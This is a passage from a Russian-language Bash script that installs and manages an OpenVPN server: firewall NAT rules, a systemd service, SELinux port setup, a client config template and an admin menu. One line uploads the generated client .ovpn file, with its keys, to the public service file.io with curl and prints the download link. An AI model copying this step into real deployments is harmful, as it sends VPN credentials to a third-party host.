			firewall-cmd --permanent --direct --add-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
		fi
	else
		# Create a service to set up persistent iptables rules
		iptables_path=$(command -v iptables)
		ip6tables_path=$(command -v ip6tables)
		# nf_tables is not available as standard in OVZ kernels. So use iptables-legacy
		# if we are in OVZ, with a nf_tables backend and iptables-legacy is available.
		if [[ $(systemd-detect-virt) == "openvz" ]] && readlink -f "$(command -v iptables)" | grep -q "nft" && hash iptables-legacy 2>/dev/null; then
			iptables_path=$(command -v iptables-legacy)
			ip6tables_path=$(command -v ip6tables-legacy)
		fi
		echo "[Unit]
Before=network.target
[Service]
Type=oneshot
ExecStart=$iptables_path -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $ip
ExecStart=$iptables_path -I INPUT -p $protocol --dport $port -j ACCEPT
ExecStart=$iptables_path -I FORWARD -s 10.8.0.0/24 -j ACCEPT
ExecStart=$iptables_path -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
ExecStop=$iptables_path -t nat -D POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $ip
ExecStop=$iptables_path -D INPUT -p $protocol --dport $port -j ACCEPT
ExecStop=$iptables_path -D FORWARD -s 10.8.0.0/24 -j ACCEPT
ExecStop=$iptables_path -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" > /etc/systemd/system/openvpn-iptables.service
		if [[ -n "$ip6" ]]; then
			echo "ExecStart=$ip6tables_path -t nat -A POSTROUTING -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to $ip6
ExecStart=$ip6tables_path -I FORWARD -s fddd:1194:1194:1194::/64 -j ACCEPT
ExecStart=$ip6tables_path -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
ExecStop=$ip6tables_path -t nat -D POSTROUTING -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to $ip6
ExecStop=$ip6tables_path -D FORWARD -s fddd:1194:1194:1194::/64 -j ACCEPT
ExecStop=$ip6tables_path -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" >> /etc/systemd/system/openvpn-iptables.service
		fi
		echo "RemainAfterExit=yes
[Install]
WantedBy=multi-user.target" >> /etc/systemd/system/openvpn-iptables.service
		systemctl enable --now openvpn-iptables.service
	fi
	# If SELinux is enabled and a custom port was selected, we need this
	if sestatus 2>/dev/null | grep "Current mode" | grep -q "enforcing" && [[ "$port" != 1194 ]]; then
		# Install semanage if not already present
		if ! hash semanage 2>/dev/null; then
			if [[ "$os_version" -eq 7 ]]; then
				# Centos 7
				yum install -y policycoreutils-python
			else
				# CentOS 8 or Fedora
				dnf install -y policycoreutils-python-utils
			fi
		fi
		semanage port -a -t openvpn_port_t -p "$protocol" "$port"
	fi
	# If the server is behind NAT, use the correct IP address
	[[ -n "$public_ip" ]] && ip="$public_ip"
	# client-common.txt is created so we have a template to add further users later
	echo "client
dev tun
proto $protocol
remote $domainuse $port
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
auth SHA512
cipher AES-256-CBC
ignore-unknown-option block-outside-dns
block-outside-dns
verb 3" > /etc/openvpn/server/client-common.txt
	# Enable and start the OpenVPN service
	systemctl enable --now openvpn-server@server.service
	# Generates the custom client.ovpn
	new_client
	echo
	echo "Установка завершена!"
	echo
	echo "Конфигурация для нового клиента расположена в:" ~/"$client.ovpn" && echo
	linktofile="$(curl -F "file=@/root/$client.ovpn" "https://file.io" | jq ".link")"
	clear
	echo -e "$linktofile - ссылка  на конфигурационный файл клиента $client" && echo
	echo "Для добавления новых клиентов, перезапустите скрипт."
else
	check_apps
	serverip123="$(curl "ifconfig.me")"
	clear
	number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
	echo -e "Скрипт установки и модерации сервера OpenVPN ${Red_font_prefix}[v${sh_ver}]${Font_color_suffix}
	---- xyl1gun4eg|tg:@xyl1gun4eg|jb:xyl1gun4eg@jabbim.com ----"
	echo
echo -e "Приветствую, администратор сервера!  Дата: $(date +"%d-%m-%Y")
  Всего пользователей на сервере:" $number_of_clients
  echo -e "
  IP сервера: $serverip123
  Выберите действие:
  ${Green_font_prefix}1.${Font_color_suffix} Добавить клиента
  ${Green_font_prefix}2.${Font_color_suffix} Добавить нескольких клиентов
  ${Green_font_prefix}3.${Font_color_suffix} Удалить клиента
  ${Green_font_prefix}4.${Font_color_suffix} Удалить OpenVPN
  ${Green_font_prefix}5.${Font_color_suffix} Выйти
  ${Green_font_prefix}6.${Font_color_suffix} Получить ссылки на конфигурации
  ${Green_font_prefix}7.${Font_color_suffix} Перенос базы OpenVPN на другой сервер"
	read -p "Действие: " option
	until [[ "$option" =~ ^[1-9]$ ]]; do
		echo "$option: выбор неверный."
		read -p "Действие: " option
	done
	case "$option" in
		1)
		adduser
		;;
		2)
		add_multi_user
		;;
		3)
		deleteuser
		;;
		4)
		uninstallovpn
		;;
		5)
		fastexit
		;;
		6)
		showlink
		;;
		7)
		transfer_options
	esac
fi
